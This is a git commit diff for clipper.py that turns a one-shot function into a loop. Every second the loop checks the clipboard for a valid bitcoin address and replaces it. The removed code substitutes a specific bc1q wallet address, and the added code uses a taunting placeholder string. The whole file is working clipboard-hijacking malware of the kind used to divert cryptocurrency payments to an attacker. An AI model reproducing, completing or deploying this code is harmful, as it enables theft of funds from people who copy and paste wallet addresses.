79295d1db3468e69debab906be55d4af56c7f946
NotKatsu <122122838+NotKatsu@users.noreply.github.com>
2023-03-26 16:39:34 +0100

    create a loop and change the address when a bitcoin address is detected

--- clipper.py
+++ clipper.py
@@ -1,13 +1,18 @@
+import asyncio
+
 from helpers.bitcoin import bitcoin
 from helpers.clipboard import clipboard
     
-def bitcoinClipper(switch_address: str):
-    clipboard_contents: str = clipboard.contents()
-    
-    if bitcoin.is_valid_address(clipboard_contents) is True:
-        clipboard.set_contents(switch_address)
-    
-if __name__ == "__main___":
-    switch_address: str = "bc1qg7dvftcxxw5cphdrn3ddhawr000ft3um9gs788"
-    
-    bitcoinClipper
+async def bitcoinClipper(switch_address: str):
+    while True:
+        await asyncio.sleep(1)
+        clipboard_contents: str = clipboard.contents()
+        
+        if bitcoin.is_valid_address(clipboard_contents) is True:
+            
+            clipboard.set_contents(switch_address)
+
+if __name__ == "__main__":
+    switch_address: str = "You just got bitcoin clippered."
+
+    asyncio.run(bitcoinClipper(switch_address=switch_address))#
